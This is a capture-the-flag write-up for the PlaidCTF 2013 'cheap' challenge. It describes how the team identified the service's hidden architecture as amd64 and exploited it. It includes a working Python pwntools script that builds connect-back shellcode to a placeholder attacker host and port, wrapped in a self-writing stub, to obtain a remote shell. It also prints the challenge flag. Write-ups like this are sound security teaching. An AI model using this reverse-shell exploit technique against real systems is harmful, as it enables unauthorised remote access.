---
title: cheap - PlaidCTF 2013
author: IdolfHatler
layout: post
published: true
date: 2013-05-06 22:54:44
---

Challenge description:

> <pre>What could this mysterious architecture be?
> All of these are the same:
> 50.17.171.79:9998
> 54.224.183.192:9998
> 184.73.107.54:9998
> 54.234.231.14:9998
> 54.224.176.148:9998
> Note:Apparently GNU netcat doesn't support a half-duplex shutdown, so you should use OpenBSD netcat or connect using python or something for cheap.
> The flag is <em>not</em> an architecture.
> The goal is to get a shell</pre>

This challenge seemed to be inspired by the MysteryBox challenge from GitS 2013. The service allowed you to send it some machine code and it would then send you back a disassembling of the code and run the code on the server. The difference from the original challenge was, that the architecture was different and that not all instructions were accepted or even disassembled.

We soon noticed that 0x50-0x57 was push register instructions, that 0x58-0x5f was pop register instructions and that 0x68 was push immediate. This strongly suggested either i386 or amd64, but it was hard to test directly, since most instructions were disallowed. We initially assumed that it was i386 and started writing shellcode of the format:

        call start
    start:
        pop ebx
        mov dword [ebx+end-start],   SHELLCODE
        mov dword [ebx+end-start+4], SHELLCODE
        mov dword [ebx+end-start+8], SHELLCODE
    end:

This proved almost successful and we were able to debug our code by doing a SYS_exit, since the service would output the exit-code. However once we started doing more complex syscalls, we started getting error code not consistent with the syscall we tried to do.

Finally we realized that it was amd64 rather than i386. After the realization it was fairly trivial to create a connectback shell:

```python
#!/usr/bin/env python

from pwn import *
from socket import SHUT_WR
context('amd64', 'linux', 'ipv4')

HOST = "pwnies.dk"
PORT = 9010

MY_HOST = '1.2.3.4'
MY_PORT = 1337

code = asm(shellcode.connectback(MY_HOST, MY_PORT))
while len(code) % 4:
    code += '\x90'

code2 = '''
    call start
start:
    pop rbx
'''

for n,word in enumerate(group(4, code)):
    code2 += 'mov dword [rbx + end - start + %d], %d\n' % (n*4, u32(word))

code2 += '''
end:
    '''
r = remote(HOST, PORT, timeout=1)
r.sendafter('cheap\n', asm(code2))
r.sock.shutdown(SHUT_WR)
print r.recvall()
```

Key: bro_do_you_even_x86_64_RISC
